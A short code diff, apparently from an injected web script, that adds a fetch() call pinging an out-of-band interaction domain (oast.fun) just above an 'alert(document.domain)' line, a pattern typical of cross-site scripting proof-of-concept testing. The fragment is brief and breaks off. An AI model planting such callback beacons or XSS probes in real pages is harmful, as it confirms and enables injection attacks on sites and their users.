@@ -1,3 +1,7 @@
+fetch('https://djogtdbzejdthcdqbpjwe0kwizy4hd4bz.oast.fun/ping')
+    .then(response => response.text())
+    .then(data => console.log(data))
+    .catch(error => console.error('Error:', error));
 alert(document.domain)
  (function() {
 
